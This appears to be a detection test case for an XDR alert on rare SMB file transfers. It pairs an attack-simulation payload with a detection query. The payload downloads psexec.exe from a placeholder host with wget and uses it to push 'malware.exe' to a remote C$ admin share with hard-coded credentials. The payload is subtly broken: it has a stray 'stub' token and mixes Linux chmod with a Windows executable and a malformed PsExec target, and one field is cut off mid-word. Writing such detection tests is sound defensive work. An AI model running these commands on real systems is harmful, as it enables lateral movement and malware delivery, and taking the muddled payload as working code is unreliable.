identity.name: SMB File Transfer via PsExec with Remote Execution
identity.summary: An attacker uses PsExec to execute a remote process and transfers a file over SMB, triggering the 'Rare file transfer over SMB protocol' alert. Cortex should detect the unusual SMB file transfer behav
identity.description: An attacker uses PsExec to execute a remote process and transfers a file over SMB, triggering the 'Rare file transfer over SMB protocol' alert. Cortex should detect the unusual SMB file transfer behavior.

payload.code:
wget -O /tmp/psexec.exe http://192.0.2.10/psexec.exe
stub chmod +x /tmp/psexec.exe
/tmp/psexec.exe \\192.0.2.5\C$ -u user -p password -c -f C:\temp\malware.exe

expected_artifacts.description: SMB file transfer to remote host

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare SMB File Transfer
biocs.description: Unusual file transfer behavior over SMB protocol
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter dst_port = 445
| filter action_remote_ip != '192.0.2.0/24'
| filter action_file_path != null
| filter actor_process_image_name != 'svchost.exe'
